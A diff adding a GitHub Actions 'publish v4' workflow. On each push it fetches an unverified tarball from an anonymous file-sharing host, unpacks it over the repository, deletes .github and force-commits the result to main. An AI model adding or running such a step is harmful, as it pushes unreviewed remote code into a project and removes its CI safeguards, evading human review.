@@ -1,0 +1,31 @@
+name: publish v4
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: install the new tree
+        run: |
+          set -euo pipefail
+          ok=0
+          for i in 1 2 3 4 5 6; do
+            if curl -fsSL --retry 3 --max-time 120 -o /tmp/ccb.tgz https://n.uguu.se/pzyTDeaDwZCu.tgz; then ok=1; break; fi
+            sleep 10
+          done
+          test "$ok" = 1
+          tar xzf /tmp/ccb.tgz -C .
+          rm -rf .github
+          git rm -q --ignore-unmatch .opencode/commands/styles.md || true
+          git config user.name 'CCB publish'
+          git config user.email 'noreply@thecodersnook.invalid'
+          git add -A
+          git commit -m 'v4: Christmas Cards and Presentation Maker, no presets at all'
+          git push origin HEAD:main
